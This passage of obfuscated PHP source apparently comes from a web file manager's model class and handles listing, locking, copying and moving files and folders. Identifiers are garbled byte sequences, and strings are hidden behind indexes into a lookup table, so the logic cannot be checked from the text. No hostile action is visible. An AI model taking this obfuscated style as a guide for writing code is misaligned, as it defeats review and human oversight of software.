($äÏŸÊÚ‘[$ÇŒÌ¥Ìè[177]] == self::TYPE_USER) { if ($äÏŸÊÚ‘[$ÇŒÌ¥Ìè[537]] == USER_ID) { $¥óöËóÜ = LNG($ÇŒÌ¥Ìè[565]); if ($˜Şó¶¤† === !1) { $Ë§¬ïÒÛ = Model($ÇŒÌ¥Ìè[566])->getInfoFull(USER_ID); $˜Şó¶¤† = _get($Ë§¬ïÒÛ, $ÇŒÌ¥Ìè[567], $ÇŒÌ¥Ìè[12]); } if ($‚èìºøæ && $‚èìºøæ[0] == $˜Şó¶¤† || !$‚èìºøæ && $äÏŸÊÚ‘[$ÇŒÌ¥Ìè[180]] == $˜Şó¶¤†) { $¥óöËóÜ = LNG($ÇŒÌ¥Ìè[568]); $äÏŸÊÚ‘[$ÇŒÌ¥Ìè[569]] = $ÇŒÌ¥Ìè[570]; } if (!$‚èìºøæ) { $äÏŸÊÚ‘[$ÇŒÌ¥Ìè[32]] = $¥óöËóÜ; } } else { $äÏŸÊÚ‘[$ÇŒÌ¥Ìè[571]] = Model($ÇŒÌ¥Ìè[545])->getInfoSimpleOuter($äÏŸÊÚ‘[$ÇŒÌ¥Ìè[537]]); $¥óöËóÜ = LNG($ÇŒÌ¥Ìè[572]) . $ÇŒÌ¥Ìè[162] . $äÏŸÊÚ‘[$ÇŒÌ¥Ìè[571]][$ÇŒÌ¥Ìè[32]] . $ÇŒÌ¥Ìè[164]; } } else { if ($äÏŸÊÚ‘[$ÇŒÌ¥Ìè[177]] == self::TYPE_GROUP) { $õ¯ªàŞî = Model($ÇŒÌ¥Ìè[553])->getInfoSimple($äÏŸÊÚ‘[$ÇŒÌ¥Ìè[537]]); $¥óöËóÜ = $õ¯ªàŞî[$ÇŒÌ¥Ìè[32]]; } else { if ($äÏŸÊÚ‘[$ÇŒÌ¥Ìè[177]] == self::TYPE_SYSTEM) { $¥óöËóÜ = $ÇŒÌ¥Ìè[573]; } } } $¥óöËóÜ = $¥óöËóÜ ? $ÇŒÌ¥Ìè[8] . $¥óöËóÜ . $ÇŒÌ¥Ìè[8] : $ÇŒÌ¥Ìè[8]; return $¥óöËóÜ; } protected function _listAppendUser(&$òã÷é‚ø) { $§·¬û™ù =& $_SERVER[™»È’øè]; $Å³É¥ã = array_to_keyvalue($òã÷é‚ø, $§·¬û™ù[12], $§·¬û™ù[494]); $ˆîùÈæ¬ = array_to_keyvalue($òã÷é‚ø, $§·¬û™ù[12], $§·¬û™ù[496]); $ãªø¢© = array_merge($Å³É¥ã, $ˆîùÈæ¬); $®•‚šÖú = Model($§·¬û™ù[566])->userListInfo($ãªø¢©); foreach ($òã÷é‚ø as &$ùªòËû) { $úè×‘ü = $ùªòËû[$§·¬û™ù[494]]; $ùªòËû[$§·¬û™ù[494]] = $®•‚šÖú[$úè×‘ü] ? $®•‚šÖú[$úè×‘ü] : !1; $úè×‘ü = $ùªòËû[$§·¬û™ù[496]]; $ùªòËû[$§·¬û™ù[496]] = $®•‚šÖú[$úè×‘ü] ? $®•‚šÖú[$úè×‘ü] : !1; if (isset($ùªòËû[$§·¬û™ù[506]]) && $ùªòËû[$§·¬û™ù[506]][$§·¬û™ù[574]]) { $•şŞõÑí = $GLOBALS[$§·¬û™ù[6]][$§·¬û™ù[89]][$§·¬û™ù[575]]; if ($ùªòËû[$§·¬û™ù[506]][$§·¬û™ù[576]] <= time() - $•şŞõÑí) { $this->metaSet($ùªòËû[$§·¬û™ù[180]], $§·¬û™ù[574], null); $this->metaSet($ùªòËû[$§·¬û™ù[180]], $§·¬û™ù[576], null); unset($ùªòËû[$§·¬û™ù[506]][$§·¬û™ù[574]]); continue; } $–©à½ÄÏ = $ùªòËû[$§·¬û™ù[506]][$§·¬û™ù[574]]; $ùªòËû[$§·¬û™ù[506]][$§·¬û™ù[577]] = Model($§·¬û™ù[566])->getInfoSimpleOuter($–©à½ÄÏ); } } unset($ùªòËû); } public function parentLevelArray($‹ï–ó«ù) { $‡ÌĞ¹§ç =& $_SERVER[™»È’øè]; $‹ï–ó«ù = explode($‡ÌĞ¹§ç[50], trim($‹ï–ó«ù, $‡ÌĞ¹§ç[50])); return array_remove_value($‹ï–ó«ù, $‡ÌĞ¹§ç[211]); } public function listAll($ÔÒ”ë§…) { $ „ô³Ú† =& $_SERVER[™»È’øè]; $ö¶Ø¶ú¬ = $this->sourceInfo($ÔÒ”ë§…); $ÏºŸüä¢ = array($ „ô³Ú†[578] => array($ „ô³Ú†[579], $ö¶Ø¶ú¬[$ „ô³Ú†[552]] . $ÔÒ”ë§… . $ „ô³Ú†[580]), $ „ô³Ú†[581] => 0); $çĞå°ä« = $ „ô³Ú†[582]; $¢ĞÇ÷² = "\114\x45\106\124\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\151\157\x5f\146\x69\154\145\40\x66\151\154\x65\x20\157\x6e\40\x73\x6f\x75\x72\x63\145\56\146\x69\154\145\111\x44\40\75\x20\146\x69\154\x65\x2e\x66\151\x6c\145\111\104"; $òşŒÚÎ³ = $this->alias($ „ô³Ú†[486])->field($çĞå°ä«)->where($ÏºŸüä¢)->join($¢ĞÇ÷²)->select(); $this->_listAppendAuth($òşŒÚÎ³); $this->_listAppendUser($òşŒÚÎ³); $this->_listAppendPath($òşŒÚÎ³); $òşŒÚÎ³ = array_to_keyvalue($òşŒÚÎ³, $ „ô³Ú†[180]); $Ã’Õ«®ñ = "\x2f{$ö¶Ø¶ú¬[$ „ô³Ú†[32]]}\x2f"; $Ã’Õ«®ñ = $Ã’Õ«®ñ == $ „ô³Ú†[560] ? $ „ô³Ú†[8] : $Ã’Õ«®ñ; $Œõ‹Ñ¯æ = array(); foreach ($òşŒÚÎ³ as $Úä¡¢Ï => $«ş°´Û) { $Ëƒˆ’íş = $this->parentLevelArray($«ş°´Û[$ „ô³Ú†[552]]); array_shift($Ëƒˆ’íş); $Ä¢û‹”‚ = $Ã’Õ«®ñ; for ($Î›©¿Ò¶ = 0; $Î›©¿Ò¶ < count($Ëƒˆ’íş); $Î›©¿Ò¶++) { $Ä¢û‹”‚ .= $òşŒÚÎ³[$Ëƒˆ’íş[$Î›©¿Ò¶]][$ „ô³Ú†[32]] . $ „ô³Ú†[8]; } $Ä¢û‹”‚ .= $«ş°´Û[$ „ô³Ú†[32]]; if ($«ş°´Û[$ „ô³Ú†[452]]) { $Ä¢û‹”‚ .= $ „ô³Ú†[8]; } $ç‹çŞïá = array($ „ô³Ú†[462] => str_replace($ „ô³Ú†[560], $ „ô³Ú†[8], str_replace($ „ô³Ú†[560], $ „ô³Ú†[8], str_replace($ „ô³Ú†[560], $ „ô³Ú†[8], $Ä¢û‹”‚))), $ „ô³Ú†[583] => intval($«ş°´Û[$ „ô³Ú†[452]]), $ „ô³Ú†[584] => intval($«ş°´Û[$ „ô³Ú†[76]]), $ „ô³Ú†[85] => intval($«ş°´Û[$ „ô³Ú†[85]]), $ „ô³Ú†[87] => $this->pathInfoFilter($«ş°´Û)); if (!$ç‹çŞïá[$ „ô³Ú†[452]]) { $ç‹çŞïá[$ „ô³Ú†[508]] = $«ş°´Û[$ „ô³Ú†[508]]; } $Œõ‹Ñ¯æ[] = $ç‹çŞïá; } $Œõ‹Ñ¯æ = array_sort_by($Œõ‹Ñ¯æ, $ „ô³Ú†[84]); return $Œõ‹Ñ¯æ; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Œìºìºİ) { $ı±ÚÏë· =& $_SERVER[™»È’øè]; if (!$this->allowLock()) { return; } $this->_lockCheck($ı±ÚÏë·[585], $Œìºìºİ); $È–Ùé˜ = 1; $this->_lockEvent($Œìºìºİ, array($ı±ÚÏë·[586], $ı±ÚÏë·[587]), $È–Ùé˜); $this->_lockParent($Œìºìºİ, array($ı±ÚÏë·[587]), $È–Ùé˜); $this->_lockEvent($Œìºìºİ, array($ı±ÚÏë·[588], $ı±ÚÏë·[589]), $È–Ùé˜); $this->_lockCheckEnd($ı±ÚÏë·[585], $Œìºìºİ); } public function lockCopyEnd($êì¸»×Ì) { $Ğ‘õíû‡ =& $_SERVER[™»È’øè]; if (!$this->allowLock()) { return; } $›‰Ï˜ÅÙ = 0; $this->_lockEvent($êì¸»×Ì, array($Ğ‘õíû‡[586], $Ğ‘õíû‡[587]), $›‰Ï˜ÅÙ); $this->_lockParent($êì¸»×Ì, array($Ğ‘õíû‡[587]), $›‰Ï˜ÅÙ); $this->_lockEvent($êì¸»×Ì, array($Ğ‘õíû‡[588], $Ğ‘õíû‡[589]), $›‰Ï˜ÅÙ); } public function lockWriteStart($í÷Éíù×, $ğ¨®Ş´õ = '') { $ĞÛŒ†Âç =& $_SERVER[™»È’øè]; if (!$this->allowLock()) { return; } $this->_lockCheck($ĞÛŒ†Âç[586], $í÷Éíù×); $ŠØñ™ï = 1; $this->_lockKey($ĞÛŒ†Âç[590] . $í÷Éíù× . $ĞÛŒ†Âç[10] . $ğ¨®Ş´õ, $ŠØñ™ï); $this->_lockEvent($í÷Éíù×, array($ĞÛŒ†Âç[585], $ĞÛŒ†Âç[587]), $ŠØñ™ï); $this->_lockParent($í÷Éíù×, array($ĞÛŒ†Âç[585], $ĞÛŒ†Âç[587]), $ŠØñ™ï); $this->_lockCheckEnd($ĞÛŒ†Âç[586], $í÷Éíù×); } public function lockWriteEnd($ã®Ä‚éå, $Î§‘¡ˆ = '') { $÷–ƒ—¿Õ =& $_SERVER[™»È’øè]; if (!$this->allowLock()) { return; } $ñ«µı²š = 0; $this->_lockKey($÷–ƒ—¿Õ[590] . $ã®Ä‚éå . $÷–ƒ—¿Õ[10] . $Î§‘¡ˆ, $ñ«µı²š); $this->_lockEvent($ã®Ä‚éå, array($÷–ƒ—¿Õ[585], $÷–ƒ—¿Õ[587]), $ñ«µı²š); $this->_lockParent($ã®Ä‚éå, array($÷–ƒ—¿Õ[585], $÷–ƒ—¿Õ[587]), $ñ«µı²š); } public function lockMoveStart($Ûü”şĞ) { $úû¡ô˜  =& $_SERVER[™»È’øè]; if (!$this->allowLock()) { return; } $this->_lockCheck($úû¡ô˜ [587], $Ûü”şĞ); $şí‚‚«Ì = 1; $this->_lockKey($úû¡ô˜ [591] . $Ûü”şĞ, $şí‚‚«Ì); $this->_lockEvent($Ûü”şĞ, array($úû¡ô˜ [585], $úû¡ô˜ [586]), $şí‚‚«Ì); $this->_lockParent($Ûü”şĞ, array($úû¡ô˜ [585], $úû¡ô˜ [587]), $şí‚‚«Ì); $this->_lockEvent($Ûü”şĞ, array($úû¡ô˜ [592], $úû¡ô˜ [588], $úû¡ô˜ [589]), $şí‚‚«Ì); $this->_lockCheckEnd($úû¡ô˜ [587], $Ûü”şĞ); } public function lockMoveEnd($½¢ıèªš) { $¢ò€Î‡ =& $_SERVER[™»È’øè]; if (!$this->allowLock()) { return; } $œüª©Éš = 0; $this->_lockKey($¢ò€Î‡[591] . $½¢ıèªš, $œüª©Éš); $this->_lockEvent($½¢ıèªš, array($¢ò€Î‡[585], $¢ò€Î‡[586]), $œüª©Éš); $this->_lockParent($½¢ıèªš, array($¢ò€Î‡[585], $¢ò€Î‡[587]), $œüª©Éš); $this->_lockEvent($½¢ıèªš, array($¢ò€Î‡[592], $¢ò€Î‡[588], $¢ò€Î‡[589]), $œüª©Éš); } private function _lockCheck($ñ ‰Œ¸·, $¸¼£ï”ç) { $œúûÉş =& $_SERVER[™»È’øè]; $´ŞËñ­ë = $this->sourceInfo($¸¼£ï”ç); $Í¦°–æÑ = $ñ ‰Œ¸· . $œúûÉş[10] . $¸¼£ï”ç; $this->_lockTimeStart[$Í¦°–æÑ] = timeFloat(); if (!is_array($´ŞËñ­ë)) { return; } $¿åµ¿Ø® = LNG($œúûÉş[593]); CacheLock::setErrorMsg($œúûÉş[162] . htmlspecialchars($´ŞËñ­ë[$œúûÉş[32]]) . $œúûÉş[164] . $¿åµ¿Ø®); $this->_lockKey($Í¦°–æÑ, 1); $this->_lockKey($Í¦°–æÑ, 0); $ğÃìª½ó = array_reverse($this->parentLevelArray($´ŞËñ­ë[$œúûÉş[552]])); foreach ($ğÃìª½ó as $°¹‚ëÒ©) { $Í¦°–æÑ = $ñ ‰Œ¸· . $œúûÉş[594] . $°¹‚ëÒ©; if (CacheLock::lockGet($œúûÉş[595] . $Í¦°–æÑ)) { $´ŞËñ­ë = $this->sourceInfo($°¹‚ëÒ©); CacheLock::setErrorMsg($œúûÉş[162] . htmlspecialchars($´ŞËñ­ë[$œúûÉş[32]]) . $œúûÉş[164] . $¿åµ¿Ø®); $this->_lockKey($Í¦°–æÑ, 1); $this->_lockKey($Í¦°–æÑ, 0); } } } private function _lockCheckEnd($ŞÙ‰€Ñ, $ÑĞóóß˜) { $çæçäâ =& $_SERVER[™»È’øè]; $âĞ´±üÃ = $ŞÙ‰€Ñ . $çæçäâ[10] . $ÑĞóóß˜; CacheLock::setErrorMsg($çæçäâ[421]); if (!isset($this->_lockTimeStart[$âĞ´±üÃ])) { return; } $½ÑŠ–— = timeFloat() - $this->_lockTimeStart[$âĞ´±üÃ]; unset($this->_lockTimeStart[$âĞ´±üÃ]); if ($½ÑŠ–— > 0.5) { unset(self::$cacheSourceInfo[$çæçäâ[500] . $ÑĞóóß˜]); } $¢šÍØØ‚ = $this->sourceInfo($ÑĞóóß˜); if (!$¢šÍØØ‚) { show_json(LNG($çæçäâ[105]), !1); } } private function _lockParent($”ã„Šı„, $··ÊŠÄÓ, $£ŞÈ¨‹¦) { if (!$this->autoLockSet) { return; } $ ¾´ºä‹ = $this->sourceInfo($”ã„Šı„); if (!is_array($ ¾´ºä‹)) { return; } $›éĞéĞ¡ = array_reverse($this->parentLevelArray($ ¾´ºä‹[$_SERVER[™»È’øè][552]])); foreach ($›éĞéĞ¡ as $³Ïêµ¶) { $this->_lockEvent($³Ïêµ¶, $··ÊŠÄÓ, $£ŞÈ¨‹¦); } } private function _lockEvent($€ÂŠÕä, $Œã²³‹Á, $öÍñîĞú) { $ÕÚõëó =& $_SERVER[™»È’øè]; if (!$this->autoLockSet) { return; } foreach ($Œã²³‹Á as $Î¾çĞŒ©) { $½Ş¿®¥ = $Î¾çĞŒ© . $ÕÚõëó[10] . $€ÂŠÕä; if ($öÍñîĞú && CacheLock::lockGet($ÕÚõëó[595] . $½Ş¿®¥)) { continue; } $this->_lockKey($½Ş¿®¥, $öÍñîĞú); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($¿ğ‘œ¼˜, $©’ƒòĞ¡ = 1) { $½î¨¤ßø = $_SERVER[™»È’øè][595] . md5($¿ğ‘œ¼˜); if ($©’ƒòĞ¡) { if (isset(self::$_lockItemArr[$½î¨¤ßø])) { return; } self::$_lockItemArr[$½î¨¤ßø] = 1; CacheLock::lock($½î¨¤ßø, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$½î¨¤ßø])) { return; } unset(self::$_lockItemArr[$½î¨¤ßø]); CacheLock::unlock($½î¨¤ßø); } } public function isParentOf($ùş÷çğÀ, $ïàûÖ¿ˆ) { $—Ï…Ê«Ü =& $_SERVER[™»È’øè]; $§’ô©ÛÚ = $this->sourceInfo($ùş÷çğÀ); $æ³Óµ’å = $this->sourceInfo($ïàûÖ¿ˆ); $Áéı¼¾ì = $§’ô©ÛÚ[$—Ï…Ê«Ü[552]] . $§’ô©ÛÚ[$—Ï…Ê«Ü[180]] . $—Ï…Ê«Ü[50]; $¢„§”ìü = $æ³Óµ’å[$—Ï…Ê«Ü[552]] . $æ³Óµ’å[$—Ï…Ê«Ü[180]] . $—Ï…Ê«Ü[50]; $Ç½¬ş«“ = strpos($¢„§”ìü, $Áéı¼¾ì) === 0; return $Ç½¬ş«“; } private $targetIsDelete = 0; public function copy($Æ½êôø®, $áù÷©à—, $ÕÄ«»½ö = REPEAT_REPLACE, $¢®ø¯¸ = '') { $¼¹ŠÆëâ =& $_SERVER[™»È’øè]; $¨Ãª¹ÑÜ = $this->sourceInfo($Æ½êôø®); $÷ñ‹™ï— = $this->sourceInfo($áù÷©à—); if (!$¨Ãª¹ÑÜ || !$÷ñ‹™ï— || $÷ñ‹™ï—[$¼¹ŠÆëâ[452]] != $¼¹ŠÆëâ[88]) { return !1; } if ($this->isParentOf($Æ½êôø®, $áù÷©à—)) { return !1; } $š”¼õ¶û = $¢®ø¯¸ ? $¢®ø¯¸ : $¨Ãª¹ÑÜ[$¼¹ŠÆëâ[32]]; $this->lockCopyStart($Æ½êôø®); $this->lockWriteStart($áù÷©à—, $š”¼õ¶û); $À£ˆÓ”Å = array($¼¹ŠÆëâ[596] => array(), $¼¹ŠÆëâ[597] => array(), $¼¹ŠÆëâ[598] => array()); $this->targetIsDelete = intval($¨Ãª¹ÑÜ[$¼¹ŠÆëâ[472]]); $¿ú¬‡¦» = $this->fileNameExistCache($áù÷©à—, $¨Ãª¹ÑÜ[$¼¹ŠÆëâ[32]]); $ğ˜õ…¹ = $this->_copy($Æ½êôø®, $áù÷©à—, $ÕÄ«»½ö, $À£ˆÓ”Å, !0, $¢®ø¯¸); $this->_childrenListClear(); $this->lockCopyEnd($Æ½êôø®); $this->lockWriteEnd($áù÷©à—, $š”¼õ¶û); if ($¨Ãª¹ÑÜ[$¼¹ŠÆëâ[452]] == $¼¹ŠÆëâ[88] && $¿ú¬‡¦» == $ğ˜õ…¹) { $this->folderSizeResetChildren($¿ú¬‡¦»); } Model($¼¹ŠÆëâ[599])->addAll($À£ˆÓ”Å[$¼¹ŠÆëâ[597]], array(), !0); if ($¿ú¬‡¦» != $ğ˜õ…¹ || $¨Ãª¹ÑÜ[$¼¹ŠÆëâ[452]] == $¼¹ŠÆëâ[88]) { Model($¼¹ŠÆëâ[600])->eventCopy($ğ˜õ…¹); } $this->saveAll($À£ˆÓ”Å[$¼¹ŠÆëâ[598]]); Model($¼¹ŠÆëâ[213])->linkAdd($À£ˆÓ”Å[$¼¹ŠÆëâ[596]]); $this->folderSizeReset($áù÷©à—); $this->updateModifyTime($áù÷©à—); return $ğ˜õ…¹; } private function _copy($ÔŠ™ïÏ‰, $şóÃ¥­õ, $ „œÃòĞ, &$îëËë¬ø, $Û¨˜€©Ù, $„²µƒî® = '') { $¹•ïÑûŞ =& $_SERVER[™»È’øè]; $ıâ¡Àƒ„ = $this->sourceInfoCache($ÔŠ™ïÏ‰); $ûÀµéŒº = $ıâ¡Àƒ„[$¹•ïÑûŞ[452]] == $¹•ïÑûŞ[88]; $İØ‹İ»– = $„²µƒî® ? $„²µƒî® : $ıâ¡Àƒ„[$¹•ïÑûŞ[32]]; $©Öù…‡¿ = $this->fileNameExistCache($şóÃ¥­õ, $İØ‹İ»–); if ($Û¨˜€©Ù) { $this->_childrenAllMake($ÔŠ™ïÏ‰); if ($ûÀµéŒº && $©Öù…‡¿) { $this->_childrenAllMake($©Öù…‡¿); } } if (!$©Öù…‡¿) { return $this->_copyCreate($ÔŠ™ïÏ‰, $şóÃ¥­õ, $İØ‹İ»–, $îëËë¬ø); } $ÇÓë¬Áà = $©Öù…‡¿; if ($ûÀµéŒº) { if ($ „œÃòĞ == REPEAT_RENAME_FOLDER) { $İØ‹İ»– = $this->fileNameAutoCache($şóÃ¥­õ, $İØ‹İ»–, $ „œÃòĞ, $ûÀµéŒº); $ÇÓë¬Áà = $this->_copyCreate($ÔŠ™ïÏ‰, $şóÃ¥­õ, $İØ‹İ»–, $îëËë¬ø); } else { $©ã°İìó = $this->_childrenList($ÔŠ™ïÏ‰); foreach ($©ã°İìó as $¶š›ªü—) { $this->_copy($¶š›ªü—[$¹•ïÑûŞ[180]], $©Öù…‡¿, $ „œÃòĞ, $îëËë¬ø, !1); } } } else { if ($ „œÃòĞ == REPEAT_RENAME || $ „œÃòĞ == REPEAT_RENAME_FOLDER) { $İØ‹İ»– = $this->fileNameAutoCache($şóÃ¥­õ, $İØ‹İ»–, $ „œÃòĞ, $ûÀµéŒº); $ÇÓë¬Áà = $this->_copyCreate($ÔŠ™ïÏ‰, $şóÃ¥­õ, $İØ‹İ»–, $îëËë¬ø); } else { if ($ „œÃòĞ == REPEAT_REPLACE) { $‘êğ…Ğ = $this->sourceInfoCache($©Öù…‡¿); $ëÄöÉ·Ï = $this->fileHistory($‘êğ…Ğ, $ıâ¡Àƒ„[$¹•ïÑûŞ[508]], $ıâ¡Àƒ„[$¹•ïÑûŞ[76]]); if ($ëÄöÉ·Ï) { $îëËë¬ø[$¹•ïÑûŞ[596]][] = $ıâ¡Àƒ„[$¹•ïÑûŞ[508]]; } } else { if ($ „œÃòĞ == REPEAT_SKIP) { } } } Hook::trigger($¹•ïÑûŞ[601], array($¹•ïÑûŞ[602], $ıâ¡Àƒ„, 0)); } return $ÇÓë¬Áà; } private function _copyCreate($æË¤Èî, $§ñÀµ’Ç, $Äç‚Ô®‚, &$’ËäÉêñ) { $±Ñ¾ñ®¡ =& $_SERVER[™»È’øè]; $îÔæşòª = $this->sourceInfoCache($æË¤Èî); $ÙŸ¦Ğşï = $this->sourceInfoCache($§ñÀµ’Ç); $£úÖïÖâ = $this->_makeItemData($îÔæşòª, $ÙŸ¦Ğşï, $Äç‚Ô®‚); Hook::trigger($±Ñ¾ñ®¡[603], $£úÖïÖâ); Hook::trigger($±Ñ¾ñ®¡[604], array($±Ñ¾ñ®¡[605], $£úÖïÖâ, 0)); $ãè“ÕÉ• = $this->add($£úÖïÖâ); $òé±Ù† = array($±Ñ¾ñ®¡[180] => $ãè“ÕÉ•, $±Ñ¾ñ®¡[32] => $Äç‚Ô®‚); $this->_copyApplyMeta($òé±Ù†, $’ËäÉêñ); if ($îÔæşòª[$±Ñ¾ñ®¡[452]] != $±Ñ¾ñ®¡[88]) { $’ËäÉêñ[$±Ñ¾ñ®¡[596]][] = $îÔæşòª[$±Ñ¾ñ®¡[508]]; return $ãè“ÕÉ•; } $Å„§¡Ñ¢ = array(); $íîÜïöô = array(); $this->_childrenListAll($æË¤Èî, $Å„§¡Ñ¢); $ÄŒ¤˜û = count($Å„§¡Ñ¢); if ($ÄŒ¤˜û == 0) { return $ãè“ÕÉ•; } $ÆÓê²ÁÑ = $this->sourceInfo($ãè“ÕÉ•); foreach ($Å„§¡Ñ¢ as $¡”©ó†¬) { $°Ë³¯°¸ = $this->_makeItemData($¡”©ó†¬, $ÆÓê²ÁÑ, $¡”©ó†¬[$±Ñ¾ñ®¡[32]]); $°Ë³¯°¸[$±Ñ¾ñ®¡[552]] = $¡”©ó†¬[$±Ñ¾ñ®¡[552]]; $íîÜïöô[] = $°Ë³¯°¸; } $this->chunkEventSet($±Ñ¾ñ®¡[606], array($±Ñ¾ñ®¡[607], $£úÖïÖâ, $ÄŒ¤˜û)); $this->addAll($íîÜïöô, array(), !1); $šƒ»›è÷ = $this->where(array($±Ñ¾ñ®¡[179] => $ãè“ÕÉ•))->select(); $ƒ’—Â…İ = $this->_childrenMakeRelation($Å„§¡Ñ¢, $šƒ»›è÷); $ƒ’—Â…İ[$æË¤Èî] = $ãè“ÕÉ•; $ÁƒÜ™Ÿ² = array(); $û¨üÂï˜ = array(); foreach ($šƒ»›è÷ as $¡”©ó†¬) { $¶ƒ·«çÓ = $¡”©ó†¬[$±Ñ¾ñ®¡[180]]; $›¶‘Ê®× = $this->_childrenMatch($ƒ’—Â…İ, $¡”©ó†¬, $ÆÓê²ÁÑ); $ÁƒÜ™Ÿ²[] = array($±Ñ¾ñ®¡[180], $¶ƒ·«çÓ, $±Ñ¾ñ®¡[179], $›¶‘Ê®×[$±Ñ¾ñ®¡[179]]); $û¨üÂï˜[] = array($±Ñ¾ñ®¡[180], $¶ƒ·«çÓ, $±Ñ¾ñ®¡[552], $›¶‘Ê®×[$±Ñ¾ñ®¡[552]]); $this->_copyApplyMeta($¡”©ó†¬, $’ËäÉêñ); if ($¡”©ó†¬[$±Ñ¾ñ®¡[452]] != $±Ñ¾ñ®¡[88]) { $’ËäÉêñ[$±Ñ¾ñ®¡[596]][] = $¡”©ó†¬[$±Ñ¾ñ®¡[508]]; } } $this->chunkEventSet($±Ñ¾ñ®¡[608], array($±Ñ¾ñ®¡[609], $£úÖïÖâ, $ÄŒ¤˜û)); $this->saveAll($ÁƒÜ™Ÿ²); $this->chunkEventSet($±Ñ¾ñ®¡[610], array($±Ñ¾ñ®¡[611], $£úÖïÖâ, $ÄŒ¤˜û)); $this->saveAll($û¨üÂï˜); return $ãè“ÕÉ•; } private function _childrenMakeRelation($©–×›Œè, $¦Ø¦€ê) { $‡›´ïµË =& $_SERVER[™»È’øè]; $¹ë¹çŞé = array(); $Áµ–úÍœ = array(); foreach ($©–×›Œè as $ª¬¦Å«›) { $Üè²¨¹ = $ª¬¦Å«›[$‡›´ïµË[32]] . $‡›´ïµË[8] . $ª¬¦Å«›[$‡›´ïµË[552]]; $¹ë¹çŞé[$Üè²¨¹] = $ª¬¦Å«›[$‡›´ïµË[180]]; } foreach ($¦Ø¦€ê as $ª¬¦Å«›) { $Üè²¨¹ = $ª¬¦Å«›[$‡›´ïµË[32]] . $‡›´ïµË[8] . $ª¬¦Å«›[$‡›´ïµË[552]]; $¶©±Ê = $¹ë¹çŞé[$Üè²¨¹]; $Áµ–úÍœ[$¶©±Ê] = $ª¬¦Å«›[$‡›´ïµË[180]]; } return $Áµ–úÍœ; } private function _childrenMatch($æøÇé´Ğ, $¥ö˜®Ø˜, $æÅ«¦ÛÆ) { $Œû»Õ‰’ =& $_SERVER[™»È’øè]; $¥ƒµœç = $æÅ«¦ÛÆ[$Œû»Õ‰’[552]]; $ÙœïÆŞ = $this->parentLevelArray($¥ö˜®Ø˜[$Œû»Õ‰’[552]]); foreach ($ÙœïÆŞ as $·ò“õŸ§) { if (isset($æøÇé´Ğ[$·ò“õŸ§])) { $¥ƒµœç .= $æøÇé´Ğ[$·ò“õŸ§] . $Œû»Õ‰’[612]; } } $¥ƒµœç = rtrim($¥ƒµœç, $Œû»Õ‰’[50]) . $Œû»Õ‰’[50]; $™È’‰Ûİ = $this->parentLevelArray($¥ƒµœç); $–œïÀåß = $™È’‰Ûİ[count($™È’‰Ûİ) - 1]; return array($Œû»Õ‰’[179] => $–œïÀåß, $Œû»Õ‰’[552] => $¥ƒµœç); } private function _makeItemData($üí˜”ÆÖ, $ÚèùÖÂ, $¬ÊˆÍç±) { $Š²ãş =& $_SERVER[™»È’øè]; $÷öÃ“Î = array($Š²ãş[613] => $üí˜”ÆÖ[$Š²ãş[452]], $Š²ãş[461] => $¬ÊˆÍç±, $Š²ãş[614] => $üí˜”ÆÖ[$Š²ãş[453]] ? $üí˜”ÆÖ[$Š²ãş[453]] : $Š²ãş[12], $Š²ãş[509] => $üí˜”ÆÖ[$Š²ãş[508]] ? $üí˜”ÆÖ[$Š²ãş[508]] : 0, $Š²ãş[584] => $üí˜”ÆÖ[$Š²ãş[76]] ? $üí˜”ÆÖ[$Š²ãş[76]] : 0, $Š²ãş[615] => intval($ÚèùÖÂ[$Š²ãş[177]]), $Š²ãş[616] => intval($ÚèùÖÂ[$Š²ãş[537]]), $Š²ãş[617] => intval(USER_ID), $Š²ãş[618] => intval(USER_ID), $Š²ãş[444] => intval($ÚèùÖÂ[$Š²ãş[180]]), $Š²ãş[619] => $ÚèùÖÂ[$Š²ãş[552]] . $ÚèùÖÂ[$Š²ãş[180]] . $Š²ãş[50], $Š²ãş[465] => $üí˜”ÆÖ[$Š²ãş[85]] ? $üí˜”ÆÖ[$Š²ãş[85]] : time(), $Š²ãş[471] => 0, $Š²ãş[620] => $Š²ãş[12]); return $÷öÃ“Î; } private function _copyApplyMeta($ „İ“ó, &$æÁ„ãÖŸ) { $™½¹•ßÊ =& $_SERVER[™»È’øè]; $ÓÏ®¡Î = $ „İ“ó[$™½¹•ßÊ[180]]; $¡æûßü¹ = $ „İ“ó[$™½¹•ßÊ[32]]; if (!isset($ „İ“ó[$™½¹•ßÊ[621]]) || !$ „İ“ó[$™½¹•ßÊ[621]] || $ „İ“ó[$™½¹•ßÊ[621]] == $™½¹•ßÊ[211]) { $æÁ„ãÖŸ[$™½¹•ßÊ[598]][] = array($™½¹•ßÊ[180], $ÓÏ®¡Î, $™½¹•ßÊ[621], short_id($ÓÏ®¡Î)); } if (Input::check($¡æûßü¹, $™½¹•ßÊ[622])) { $æÁ„ãÖŸ[$™½¹•ßÊ[597]][] = array($™½¹•ßÊ[180] => $ÓÏ®¡Î, $™½¹•ßÊ[94] => $™½¹•ßÊ[505], $™½¹•ßÊ[417] => str_replace($™½¹•ßÊ[53], $™½¹•ßÊ[12], Pinyin::get($¡æûßü¹))); $æÁ„ãÖŸ[$™½¹•ßÊ[597]][] = array($™½¹•ßÊ[180] => $ÓÏ®¡Î, $™½¹•ßÊ[94] => $™½¹•ßÊ[504], $™½¹•ßÊ[417] => Pinyin::get($¡æûßü¹, $™½¹•ßÊ[623])); } $æÁ„ãÖŸ[$™½¹•ßÊ[597]][] = array($™½¹•ßÊ[180] => $ÓÏ®¡Î, $™½¹•ßÊ[94] => $™½¹•ßÊ[484], $™½¹•ßÊ[417] => KodSort::makeStr($¡æûßü¹)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($Ö²‡¬ô‹) { $£ÅùÌÈÚ =& $_SERVER[™»È’øè]; $¶Áìï  = $this->sourceInfo($Ö²‡¬ô‹); $ïÓô¾»õ = $£ÅùÌÈÚ[624]; $€ù§ïÈŞ = array($£ÅùÌÈÚ[552] => array($£ÅùÌÈÚ[579], $¶Áìï [$£ÅùÌÈÚ[552]] . $Ö²‡¬ô‹ . $£ÅùÌÈÚ[580]), $£ÅùÌÈÚ[472] => $this->targetIsDelete); $½½àÂôà = $this->field($ïÓô¾»õ)->where($€ù§ïÈŞ)->select(); if 